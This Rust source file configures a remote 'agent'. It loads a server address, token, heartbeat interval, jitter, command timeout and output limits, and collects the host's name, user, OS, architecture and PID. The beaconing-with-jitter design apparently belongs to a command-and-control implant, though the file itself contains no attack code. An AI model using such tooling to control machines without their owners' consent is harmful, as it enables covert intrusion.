//! Config - runtime configuration

use crate::sys;

pub struct Config {
    pub server_addr: String,
    pub agent_token: Option<String>,
    pub heartbeat_secs: u64,
    pub reconnect_secs: u64,
    pub jitter: u32,
    pub command_timeout_secs: u64,
    pub max_output_chars: usize,
    pub max_list_entries: usize,
    pub metadata: Metadata,
}

pub struct Metadata {
    pub agent_id: String,
    pub hostname: String,
    pub username: Option<String>,
    pub os: Option<String>,
    pub arch: Option<String>,
    pub pid: u32,
}

impl Config {
    pub fn load() -> Result<Self, ()> {
        let hostname = sys::get_hostname();
        let username = sys::get_username();
        let pid = sys::get_pid();

        Ok(Self {
            server_addr: crate::server::get_server_addr(),
            agent_token: crate::server::get_agent_token(),
            heartbeat_secs: crate::server::get_heartbeat_secs(),
            reconnect_secs: 3,
            jitter: crate::server::get_jitter(),
            command_timeout_secs: 20,
            max_output_chars: 6000,
            max_list_entries: 120,
            metadata: Metadata {
                agent_id: derive_agent_id(&hostname),
                hostname,
                username: if username.trim().is_empty() {
                    None
                } else {
                    Some(username)
                },
                os: Some(sys::get_os().to_string()),
                arch: Some(sys::get_arch().to_string()),
                pid,
            },
        })
    }
}

fn derive_agent_id(hostname: &str) -> String {
    let Some(file_stem) = std::env::current_exe().ok().and_then(|path| {
        path.file_stem()
            .map(|value| value.to_string_lossy().into_owned())
    }) else {
        return hostname.to_string();
    };

    if file_stem == "agent" || file_stem.starts_with("agent-") {
        hostname.to_string()
    } else {
        file_stem
    }
}
